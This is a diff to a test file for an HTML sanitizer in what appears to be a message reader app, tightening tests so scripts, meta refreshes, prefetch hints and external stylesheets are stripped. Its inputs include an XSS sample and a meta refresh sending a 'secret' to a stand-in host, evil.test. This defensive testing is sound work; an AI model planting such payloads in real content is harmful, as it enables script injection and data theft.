@@ -21,7 +21,8 @@ it("keeps desktop resource restrictions and adds form/base CSP before untrusted 
   const html = readerDocument(
     '<img src="https://example.test/image.png"><script>alert(1)</script>',
   );
-  expect(html.indexOf("Content-Security-Policy")).toBeLessThan(html.indexOf("<script>"));
+  expect(html).toContain("Content-Security-Policy");
+  expect(html).not.toContain("<script>");
   const view = readFileSync(new URL("../app/reader.tsx", import.meta.url), "utf8");
   expect(view).toContain("javaScriptEnabled={false}");
   expect(view).toContain("allowFileAccess={false}");
@@ -42,12 +43,12 @@ it("strips POST form subtrees including mixed case, quoted > attributes and malf
   }
 });
 
-it("blocks refresh and resource hints while preserving stylesheet links", () => {
+it("blocks refresh, resource hints and external stylesheet links", () => {
   const html = readerDocument(
     '<META HTTP-EQUIV="refresh" content="0;url=https://evil.test/?id=secret"><meta http-equiv="Content-Security-Policy" content="img-src *"><link rel="prefetch" href="https://evil.test"><link href="https://evil.test"><link rel="stylesheet" href="https://styles.test/theme.css"><p>Message text</p>',
   );
   expect(html).not.toContain("evil.test");
-  expect(html).toContain('rel="stylesheet"');
+  expect(html).not.toContain('rel="stylesheet"');
   expect(html.match(/http-equiv=/gi)).toHaveLength(1);
   expect(readerDocument('<img src="http://images.test/a">', true)).toContain(
     "img-src data: cid: https:",
